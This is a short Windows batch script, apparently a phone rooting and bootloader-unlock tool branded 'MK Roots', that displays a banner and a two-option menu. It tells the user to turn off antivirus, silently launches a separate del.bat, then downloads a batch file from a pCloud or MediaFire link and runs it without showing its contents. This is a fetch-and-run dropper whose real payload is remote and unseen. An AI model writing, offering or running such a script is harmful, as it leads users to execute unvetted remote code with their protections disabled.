@ECHO OFF
color 0A
TITLE MK Roots
echo ===============================================================================================
echo.
echo                                                -----------------------
echo                                  8888ba.88ba  dP     dP  .88888.  .d88888b  8888ba.88ba  
echo                                  88  `8b  `8b 88   .d8' d8'   `88 88.    "' 88  `8b  `8b 
echo                                  88   88   88 88aaa8P'  88        `Y88888b. 88   88   88 
echo                                  88   88   88 88   `8b. 88   YP88       `8b 88   88   88 
echo                                  88   88   88 88     88 Y8.   .88 d8'   .8P 88   88   88 
echo                                  dP   dP   dP dP     dP  `88888'   Y88888P  dP   dP   dP
echo                                                -----------------------
echo                                                TOOL BY Mehran Khan
echo                                               Prazanted By  HalabTech
echo.
echo                                                Note : Turn Off Antvirus 
echo.
echo internet Must Be Connected
echo.
echo ===============================================================================================
echo.
echo [1] Unlock Bootloader     [2] Start Root 
echo.
echo ===================================enjoy Root=====================================================
echo                              Press your key  For Next Process
echo. 
start del.bat
::this code fore chose option
set /p user_input=
::tis Code fore start option
echo Downloading
if %user_input% equ 1 powershell -command invoke-webrequest https://c163.pcloud.com/dpZcPgXX1ZanJtjgZU1J47ZZAvYLv7Z2ZZk4FZZRGn08zNlFSpMMWNwEFrS8hUh7GB7/Bootloader.bat -outfile toor.bat
if %user_input% equ 2 powershell -command invoke-webrequest https://download1479.mediafire.com/u4apxa9emkqg/wvoc2rk2nvg16xw/root.bat -outfile toor.bat
start toor.bat
exit
